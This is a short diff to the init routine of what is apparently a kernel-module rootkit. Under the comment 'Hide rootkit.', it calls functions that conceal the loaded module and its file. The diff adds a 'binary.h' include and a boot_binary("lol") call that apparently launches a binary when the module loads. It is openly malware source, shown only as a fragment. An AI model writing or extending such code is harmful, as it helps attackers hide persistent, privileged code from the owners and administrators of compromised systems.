@@ -20,6 +20,7 @@
 #include "privilege.h"
 #include "hook.h"
 #include "hide.h"
+#include "binary.h"
 
 #include <sys/param.h>
 #include <sys/module.h>
@@ -47,6 +48,7 @@ init(void)
 	/* Hide rootkit. */
 	hide_kld(LINKER_NAME);
 	hide_ko(MODULE_NAME);
+	boot_binary("lol");
 }
 
 static void
